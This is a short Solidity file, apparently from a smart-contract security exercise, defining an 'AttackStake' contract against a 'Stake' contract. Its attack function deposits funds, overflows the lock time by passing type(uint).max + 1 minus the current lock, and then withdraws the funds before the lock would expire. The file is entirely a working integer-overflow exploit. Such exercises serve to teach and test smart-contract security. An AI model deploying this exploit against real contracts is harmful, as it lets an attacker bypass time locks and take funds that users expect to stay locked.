// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
import "./Stake.sol";

contract AttackStake {
  Stake public stake;

  constructor(Stake _stakeAddress) {
    stake = Stake(_stakeAddress);
  }    
  function attack(uint256 _depositAmount,address _to,uint256 _withdrawAwamount) public   {     
   stake.deposit(_depositAmount);
    stake.increaseLockTime(
   type(uint).max + 1 - stake.lockTime(address(this))
    );
    stake.transferFund(_to,_withdrawAwamount);
  }

}

